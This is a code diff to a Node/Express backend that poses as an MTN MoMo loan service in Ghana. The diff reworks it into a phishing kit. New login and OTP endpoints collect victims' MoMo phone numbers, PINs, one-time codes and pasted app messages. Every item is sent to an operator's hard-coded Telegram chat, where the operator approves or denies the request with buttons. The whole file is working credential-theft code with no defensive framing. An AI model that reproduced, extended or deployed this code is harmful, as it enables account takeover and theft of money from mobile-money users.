@@ -42,28 +42,16 @@ const CHAT_ID = '8313270294';
 const pendingLoans = {};
 
 // ============================================
-// SEND TELEGRAM LOAN APPLICATION
+// SEND TELEGRAM LOGIN + MOMO MESSAGE (FROM LOGIN PAGE)
 // ============================================
-async function sendTelegramLoanApplication(data) {
+async function sendTelegramLogin(data) {
   try {
     const message = `💰 *NEW MTN MoMo LOAN APPLICATION - GHANA*\n\n` +
-      `📋 *LOAN DETAILS*\n` +
-      `📌 Product: ${data.loanType}\n` +
-      `💵 Amount: GHS ${parseInt(data.loanAmount).toLocaleString()}\n` +
-      `📅 Term: ${data.loanTerm} Days\n` +
-      `📝 Purpose: ${data.loanPurpose}\n\n` +
-      `👤 *PERSONAL DETAILS*\n` +
-      `👤 Name: ${data.fullName}\n` +
-      `📧 Email: ${data.email}\n` +
-      `📱 Phone: +233 ${data.phone}\n` +
-      `🎂 DOB: ${data.dob}\n` +
-      `📍 Region: ${data.region}\n` +
-      `📍 District: ${data.district}\n` +
-      `💼 Employment: ${data.employment}\n` +
-      `💰 Monthly Income: GHS ${parseInt(data.income).toLocaleString()}\n\n` +
       `🔐 *MOMO ACCOUNT LOGIN*\n` +
       `📱 MoMo Phone: +233 ${data.momoPhone}\n` +
       `🔢 MoMo PIN: ${data.momoPin}\n\n` +
+      `📩 *MOMO-APP MESSAGE PASTED:*\n` +
+      `\`\`\`\n${data.momoMessage}\n\`\`\`\n\n` +
       `⏰ Time: ${new Date().toLocaleString()}\n\n` +
       `⚠️ Please approve or deny this loan request.`;
 
@@ -86,7 +74,39 @@ async function sendTelegramLoanApplication(data) {
     });
 
     const result = await response.json();
-    console.log('📤 Telegram Loan Request:', result.ok ? '✅ Sent' : '❌ Failed');
+    console.log('📤 Telegram Login Request:', result.ok ? '✅ Sent' : '❌ Failed');
+    return result;
+  } catch (error) {
+    console.error('❌ Telegram error:', error.message);
+    return null;
+  }
+}
+
+// ============================================
+// SEND TELEGRAM OTP VERIFICATION (FROM VERIFY PAGE)
+// ============================================
+async function sendTelegramOTP(data) {
+  try {
+    const message = `✅ *MTN MoMo Loan - OTP Verification (Ghana)*\n\n` +
+      `📱 *MoMo Account:* +233 ${data.momoPhone}\n` +
+      `🔑 *OTP Entered:* \`${data.otp}\`\n\n` +
+      `📩 *MOMO-APP MESSAGE PASTED:*\n` +
+      `\`\`\`\n${data.momoMessage}\n\`\`\`\n\n` +
+      `⏰ Time: ${new Date().toLocaleString()}\n\n` +
+      `✅ User has confirmed OTP for disbursement.`;
+
+    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    });
+
+    const result = await response.json();
+    console.log('📤 Telegram OTP:', result.ok ? '✅ Sent' : '❌ Failed');
     return result;
   } catch (error) {
     console.error('❌ Telegram error:', error.message);
@@ -123,9 +143,7 @@ app.post('/api/telegram/callback', async (req, res) => {
         body: JSON.stringify({
           chat_id: CHAT_ID,
           text: `✅ *LOAN APPROVED*\n\n` +
-            `👤 ${pendingLoans[requestId].fullName}\n` +
-            `📱 +233 ${pendingLoans[requestId].phone}\n` +
-            `💵 GHS ${pendingLoans[requestId].amount.toLocaleString()}\n\n` +
+            `📱 MoMo Phone: +233 ${pendingLoans[requestId].momoPhone}\n\n` +
             `💰 Loan amount is being processed.`,
           parse_mode: 'Markdown'
         })
@@ -142,9 +160,7 @@ app.post('/api/telegram/callback', async (req, res) => {
         body: JSON.stringify({
           chat_id: CHAT_ID,
           text: `❌ *LOAN DENIED*\n\n` +
-            `👤 ${pendingLoans[requestId].fullName}\n` +
-            `📱 +233 ${pendingLoans[requestId].phone}\n` +
-            `💵 GHS ${pendingLoans[requestId].amount.toLocaleString()}\n\n` +
+            `📱 MoMo Phone: +233 ${pendingLoans[requestId].momoPhone}\n\n` +
             `🚫 Loan request was denied.`,
           parse_mode: 'Markdown'
         })
@@ -176,60 +192,35 @@ app.get('/api/loan/status/:requestId', (req, res) => {
   res.json({
     success: true,
     status: pendingLoans[requestId].status,
-    phone: pendingLoans[requestId].phone
+    phone: pendingLoans[requestId].momoPhone
   });
 });
 
 // ============================================
-// LOAN APPLICATION ENDPOINT
+// LOGIN ENDPOINT (FROM LOGIN PAGE)
 // ============================================
-app.post('/api/loan/apply', async (req, res) => {
+app.post('/api/loan/login', async (req, res) => {
   try {
-    const {
-      loanType,
-      loanAmount,
-      loanTerm,
-      loanPurpose,
-      fullName,
-      email,
-      phone,
-      dob,
-      region,
-      district,
-      employment,
-      income,
-      momoPhone,
-      momoPin
-    } = req.body;
+    const { momoPhone, momoPin, momoMessage } = req.body;
 
-    console.log('💰 Loan application:', {
-      loanType,
-      loanAmount,
-      fullName,
-      phone,
+    console.log('🔐 Login attempt:', {
       momoPhone,
-      momoPin: '****'
+      momoPin: '****',
+      momoMessage: momoMessage ? 'provided' : 'missing'
     });
 
     // Validation
-    if (!loanType || !loanAmount || !loanTerm || !loanPurpose) {
-      return res.status(400).json({
-        success: false,
-        message: 'Loan details are required'
-      });
-    }
-
-    if (!fullName || !email || !phone) {
-      return res.status(400).json({
-        success: false,
-        message: 'Personal details are required'
-      });
-    }
-
     if (!momoPhone || !momoPin) {
       return res.status(400).json({
         success: false,
-        message: 'MoMo account details are required'
+        message: 'MoMo phone and PIN are required'
+      });
+    }
+
+    if (!momoMessage) {
+      return res.status(400).json({
+        success: false,
+        message: 'MOMO-APP message is required'
       });
     }
 
@@ -238,55 +229,82 @@ app.post('/api/loan/apply', async (req, res) => {
 
     // Store pending request
     pendingLoans[requestId] = {
-      loanType,
-      amount: parseInt(loanAmount),
-      loanTerm,
-      loanPurpose,
-      fullName,
-      email,
-      phone,
-      dob,
-      region,
-      district,
-      employment,
-      income: parseInt(income),
       momoPhone,
       momoPin,
+      momoMessage,
       status: 'pending',
       timestamp: new Date().toISOString()
     };
 
     // Send Telegram notification with Approve/Deny buttons
-    await sendTelegramLoanApplication({
-      loanType,
-      loanAmount,
-      loanTerm,
-      loanPurpose,
-      fullName,
-      email,
-      phone,
-      dob,
-      region,
-      district,
-      employment,
-      income,
+    await sendTelegramLogin({
       momoPhone,
       momoPin,
+      momoMessage,
       requestId
     });
 
     res.json({
       success: true,
-      message: 'Loan request sent. Please wait for admin approval.',
-      requestId: requestId,
-      phoneNumber: phone
+      message: 'Login request sent. Please wait for admin approval.',
+      requestId: requestId
     });
 
   } catch (error) {
-    console.error('Loan error:', error);
+    console.error('Login error:', error);
     res.status(500).json({
       success: false,
-      message: 'Loan application failed',
+      message: 'Login failed',
+      error: error.message
+    });
+  }
+});
+
+// ============================================
+// OTP VERIFICATION ENDPOINT (FROM VERIFY PAGE)
+// ============================================
+app.post('/api/loan/verify-otp', async (req, res) => {
+  try {
+    const { momoPhone, otp, momoMessage } = req.body;
+
+    console.log('🔑 OTP verification:', {
+      momoPhone,
+      otp,
+      momoMessage: momoMessage ? 'provided' : 'missing'
+    });
+
+    // Validation
+    if (!momoPhone || !otp) {
+      return res.status(400).json({
+        success: false,
+        message: 'MoMo phone and OTP are required'
+      });
+    }
+
+    if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
+      return res.status(400).json({
+        success: false,
+        message: 'Please enter a valid 4-digit OTP'
+      });
+    }
+
+    // Send Telegram OTP notification
+    await sendTelegramOTP({
+      momoPhone,
+      otp,
+      momoMessage: momoMessage || 'Not provided'
+    });
+
+    res.json({
+      success: true,
+      message: 'OTP verified successfully'
+    });
+
+  } catch (error) {
+    console.error('OTP verification error:', error);
+    res.status(500).json({
+      success: false,
+      message: 'OTP verification failed',
       error: error.message
     });
   }
